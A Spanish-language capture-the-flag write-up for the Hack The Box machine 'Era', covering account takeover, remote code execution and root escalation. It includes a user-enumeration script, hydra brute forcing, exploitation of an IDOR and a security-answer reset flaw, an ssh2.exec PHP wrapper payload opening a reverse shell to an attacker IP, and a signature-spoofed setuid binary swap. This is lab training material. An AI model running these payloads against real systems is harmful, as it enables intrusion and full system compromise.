# Era

<img width="670" height="512" alt="image" src="https://github.com/user-attachments/assets/d010b159-58a8-4a3f-ac48-039070b8fa49" />

# Reconocimento

```bash
nmap -Pn -n -sS -p- -sCV --min-rate 5000 10.10.11.79
```
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 13:39 -03
Nmap scan report for 10.10.11.79
Host is up (0.15s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://era.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.00 seconds
```

Agregamos el dominio reportado a nuestro archivo `/etc/hosts` y accedemos al servicio web

```bash
echo '10.10.11.79 era.htb' >> /etc/hosts
```

<img width="1918" height="1055" alt="image" src="https://github.com/user-attachments/assets/5856dd25-7403-4c6c-80dc-9d23fef7e01a" />

tras chequear la web lo mas probable es que tengo un subdominio asi que vamos hacer fuzzing

```bash
wfuzz -H "Host: FUZZ.era.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u 'http://era.htb/' --hh=154
```

<img width="1918" height="494" alt="image" src="https://github.com/user-attachments/assets/9dbaa293-b579-4f54-b540-84f01fb714c6" />


agregamos el subdominio a `/etc/hosts` y accedemos a el

<img width="1918" height="1046" alt="image" src="https://github.com/user-attachments/assets/0e068b69-daf6-47fc-814b-22eb1d7575e7" />

tras acceder a alguna de la opciones nos redirige a la misma pagina de login donde no podemos determinar si un usuario existe o no en el sistema, sin embargo si podemos determinarlo a traves de `http://file.era.htb//security_login.php`

>>> cuando un usuario no esta registrado el mensaje es `User not found.`

<img width="1920" height="1056" alt="image" src="https://github.com/user-attachments/assets/0fa43397-764f-430a-819f-296c86ded4cf" />

>>> cuando un usuario si esta registrado el mensaje es `Incorrect answers. Please try again.`

<img width="1920" height="1056" alt="image" src="https://github.com/user-attachments/assets/eafaad25-9f7a-49ba-8d2d-a285ada348bd" />

para determinar los usuarios que se encuentran registrados vamos a tener que hacer un ataque de diccionario para encontrarlos, por lo que primero me armo un script que automatice esto

```bash
nano script.sh
```
```bash
#!/bin/bash

echo -e "Testeando Usuarios!\n..."

while IFS= read -r USER; do
    status=$(curl -s -X POST http://file.era.htb/security_login.php -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "Content-Type: application/x-www-form-urlencoded" -H "Origin: http://file.era.htb" -H "Referer: http://file.era.htb/security_login.php" -d "username=$USER&answer1=123&answer2=354rf&answer3=erg" | grep -w 'Incorrect answers. Please try again.' | awk -F ">|<|'|=" '{print $6}')
    if [[ "$status" == "Incorrect answers. Please try again." ]]; then
        echo -e "Usuario Detectado: $USER"
    fi
done < /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt

```

ejecutamos el script

```bash
bash script.sh
```

<img width="1920" height="268" alt="image" src="https://github.com/user-attachments/assets/32b38e98-f183-44a0-ac90-d2bd09eb4060" />

vemos que nos saca 2 usuarios registrados por lo que ahora hacemos un ataque de diccionario contra el panel de login

```bash
hydra -l eric -P /usr/share/wordlists/rockyou.txt 'http-post-form://file.era.htb/login.php:submitted=true&username=^USER^&password=^PASS^:Invalid username or password.' -I -F -f
```

<img width="1920" height="257" alt="image" src="https://github.com/user-attachments/assets/06cc4d96-8860-4a84-b9e4-eb381325130f" />

obtenemos credenciales para el usuario `eric`

>>> credenciales eric:america

accedmos al portal y en la seccion de carga de archivos vemos lo siguiente al testear cargar un archivo

<img width="1920" height="1055" alt="image" src="https://github.com/user-attachments/assets/ab047a80-b6d3-4d9e-9e47-6c64ea5e4153" />

accedemos al `link: http://file.era.htb/download.php?id=6758`

<img width="1920" height="1055" alt="image" src="https://github.com/user-attachments/assets/fb294b67-6664-47f5-9c36-9be0608798bf" />

probamos si es vulnerable a un `IDOR` a traves de `CAIDO`

<img width="1920" height="1055" alt="image" src="https://github.com/user-attachments/assets/ea6b5041-729a-4992-8f2e-d8a18435bb9a" />

usamos el filtro `resp.raw.ncont:"File Not Found"` para filtrar solo por los resultados que contengan un resultado valido

<img width="1920" height="1055" alt="image" src="https://github.com/user-attachments/assets/83e3765a-86ce-41bf-aff5-2e8a3f6a80c1" />

accedemos a cada ID

<img width="1920" height="1055" alt="image" src="https://github.com/user-attachments/assets/c43312e2-3549-4246-b02f-0900e8318cf4" />

nos descargamos los archivos 

<img width="1920" height="306" alt="image" src="https://github.com/user-attachments/assets/19320f2e-e5d7-4a5c-9599-105a201d43ba" />

descomprimimos los archivos `.zip`

<img width="1920" height="306" alt="image" src="https://github.com/user-attachments/assets/cf7fefa4-5c22-4a62-8dd8-fd3dd89e72bc" />

hemos descargado el codigo fuente del sitio web y un posible Certificado SSL/TLS 

## Analisis de codigo fuente

Tras un analisis del codigo fuente, entre las vulnerabilidades conseguidas la que destaca en principo es una en el archivo `reset.php`

```php
$query = "UPDATE users SET security_answer1 = ?, security_answer2 = ?, security_answer3 = ? WHERE user_name = ?";
```

No verifica si el usuario que hace la solicitud es el dueño de la cuenta, por lo que podriamos cambiar las respues de seguridad de otro usuario y acceder con el a traves de `http://file.era.htb/security_login.php`.
Como ya sabemos que existe otro usuario `(john)` podemos cambiar sus respues de seguridad y loguearnos como `john`

Para hacer el cambio de respuestamos priumero nos logueamos como el usuario `eric` (Ya tenemos sus credenciales) y una vez logueados nos vamos a `http://file.era.htb/reset.php`

<img width="1920" height="1004" alt="image" src="https://github.com/user-attachments/assets/22fc4769-f2c1-495d-8364-958233c010c2" />


nos logueamos como john
<img width="1920" height="1004" alt="image" src="https://github.com/user-attachments/assets/0948a213-8cb4-409a-8c37-cea84c85447d" />

Ya sabemos que funciona, ahora si revisamos la base de datos que tambien viene en los archivos descargados veremos lo siguiente

<img width="1920" height="336" alt="image" src="https://github.com/user-attachments/assets/74e01ec0-1274-48c8-b541-6ca20d0c4ee7" />

ya sabemos cual es el usuario admin `admin_ef01cab31aa` asi que le podemos cambiar las respuestas de seguridad y accedemos como el usuario admin (mismo proceso anterior)

### Inyeccion de Wrapper PHP

existe otra vulnerabilidad en el codigo fuente que sera la que nos permitira obtener `RCE`, esta vez se localiza en el archivo `download.php`

>>> Fragmento de codigo Vulnerable a inyeccion Wrapper PHP

```php
$format = isset($_GET['format']) ? $_GET['format'] : '';
// ...
if (strpos($format, '://') !== false) {
    $wrapper = $format;
    header('Content-Type: application/octet-stream');
}
// ...
$file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
```
El problema principal está en cómo se maneja el parámetro `format:`.
Esto lo podriamos explotar con privilegios de administrador usando wrappers PHP maliciosos. El problema es que aunque si podemos inyectar el wrapper, 
no es posible ejecutar codigo ya que `fopen` no nos permite ejecutar codigo, para esto necesitariamos que en vez de `fopen` estuviera un `include` o `require` y asi podriamos lograr `rce`.
 
Pero no todo esta perdido porque investigando diferentes tipos de wrappers me consegui con uno que al testearlo logramos `RCE` `Wrapper PHP ssh2.exec`
 
Explotacion:
 
Primero nos loguemos como el usuario administrador `admin_ef01cab31aa`, despues testeamos el wrapper
 
Sintaxis
```java
ssh2.exec://<user>:<pass>@<ip>/<comando>
```
Despues de testear con las credenciales que hemos ido obteniendo durante el camino, dimos por fin con el `RCE`
      
payload
```bash
http://file.era.htb/download.php?id=150&show=true&format=ssh2.exec://eric:america@127.0.0.1/%2Fbin%2Fbash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.128%2F5551%200%3E%261%22;id
```
 
<img width="1920" height="1077" alt="image" src="https://github.com/user-attachments/assets/88225128-48e0-415f-9a3f-12c75661d105" />

Obtuvimos una revershell

>>> Es necesario aclarar que para que el wrapper usado funcionara el host objetivo debe tener instaldo el cliente `ssh` en el sistema y tambien la extension en `php` del wrapper `ssh2`, ya que si esto no se cumple el wrapper no funciona

# Escalada de Privilegios

### eric

El usuario no tiene permisos sudo pero vemos que pertenece al grupo `devs` 

<img width="1920" height="108" alt="image" src="https://github.com/user-attachments/assets/cb12ec1a-11aa-43a9-a4b3-e9776192a934" />

asi que hacemos una busqueda en el sistema de archivos bajo dicho grupo

```bash
find / -group devs -type f 2>/dev/null
```
```bash
/opt/AV/periodic-checks/monitor
/opt/AV/periodic-checks/status.log
```

conseguimos 2 archivos que son propiedad de root pero que estan bajo el grupo `devs`


<img width="1920" height="225" alt="image" src="https://github.com/user-attachments/assets/1cdce9d3-6524-4b5f-8728-94df0e3dd4cc" />

el archivo `monitor` es un binario y como es obvio, el otro un registro de log.... si vemos los procesos que corren veremos `cron` lo que nos podria decir que existe una tarea programada

<img width="1920" height="225" alt="image" src="https://github.com/user-attachments/assets/ad3a0724-2150-43ec-8ec7-4e1cb8e5ae91" />

asi que vamos a ver en tiempo real los procesos y vamos a filtrar por `monitor` a ver si en algun momento se ejecuta el binairo que hemos conseguido

```bash
watch -n 0.1 "ps auxf |grep monitor |grep -v grep" # vemos los procesos en tiempo real
```

<img width="1920" height="198" alt="image" src="https://github.com/user-attachments/assets/a2f6571f-d315-4cee-b324-1c9a32d04f21" />

esta ejecutando el binario a traves de un script bash, intente cambiar el binairo por otro pero no lo ejecuta asi que lo que hare sera copiar la seccion `.text_sig` del binario original a mi binario malicioso a ver si es suficiente para saltar la validacion que este realizando por detras...

>>> .text_sig es una sección ELF arbitraria añadida manualmente para guardar una firma digital del binario. El sistema operativo o el linker no la interpreta automáticamente. Solo tiene utilidad si una herramienta o programa personalizado la usa para verificar la integridad o autenticidad del binario
 
binario malicioso `monitor2`
```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    // Ejecuta el comando que nos dara la escalada a root
    int result = system("chmod u+s /bin/bash");

    if (result == -1) {
        perror("Error al ejecutar el comando ls");
        return 1;
    }

    return 0;
}

```

compilamos el binario
```bash
gcc -static monitor2.c -o monitor2
```

copiamos la seccion `.text_sig` desde el binario original hasta nuestro binario malicioso

```bash
objcopy --dump-section .text_sig=sig monitor # extraemos la seccion desde el binario original y la almacenamos en el archivo sig
```
```bash
objcopy --add-section .text_sig=sig monitor2 # copiamos la seccion extraida al binario malicioso
```
```bash
mv monitor monitor_original && mv monitor2 monitor && ls -la /bin/bash  # cambiamos los nombres de los binarios para suplantar el original con el malicioso y consultamos los permisos de /bin/bash (inicialmente normales)
```
Esperamos un rato para volver a consultar los permisos de `/bin/bash` y vemos que a funcionado

```bash
ls -la /bin/bash
```


<img width="1920" height="257" alt="image" src="https://github.com/user-attachments/assets/982f0e4a-c59a-4ce1-91cb-61df04013b99" />

podemos escalar a `root`

<img width="1920" height="479" alt="image" src="https://github.com/user-attachments/assets/120a0e9b-0de6-4171-85d9-17898cbd8ead" />






